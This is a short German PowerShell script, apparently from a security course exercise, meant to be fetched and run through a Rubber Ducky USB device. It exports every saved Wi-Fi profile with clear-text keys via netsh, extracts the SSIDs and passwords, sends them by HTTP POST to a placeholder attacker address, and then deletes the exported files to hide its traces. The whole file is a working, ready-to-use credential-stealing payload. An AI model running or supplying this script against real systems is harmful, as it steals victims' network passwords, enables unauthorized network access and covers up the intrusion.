# ============================================================
#  W02a.6 – Custom Attack: WLAN-Passwörter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Wird per IEX vom Rubber Ducky heruntergeladen und ausgeführt
#
#  Ziel: Gespeicherte WLAN-Passwörter des Opfer-Systems stehlen
#  Ersetze ATTACKER_IP mit der echten IP-Adresse!
# ============================================================

$ATTACKER = "http://ATTACKER_IP:8080/collect"

# WLAN-Profile als XML mit Klartextpasswörtern exportieren
$tmpDir = $env:TEMP
Push-Location $tmpDir

try {
    # Alle WLAN-Profile exportieren (key=clear = Klartextpasswort in XML)
    netsh wlan export profile key=clear | Out-Null

    # keyMaterial-Tag enthält das Passwort im Klartext
    $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
                 ForEach-Object {
                     $file = $_.Filename -replace "Wi-Fi-|\.xml", ""
                     $pass = $_.Matches.Groups[1].Value
                     "SSID: $file | Passwort: $pass"
                 }

    $report = "=== WIFI PASSWORDS ===`n" + ($passwords -join "`n")

    # Exfiltrieren
    Invoke-WebRequest -Uri $ATTACKER -Method POST -Body $report -UseBasicParsing | Out-Null

} finally {
    # Spuren verwischen
    Remove-Item "Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue
    Pop-Location
}
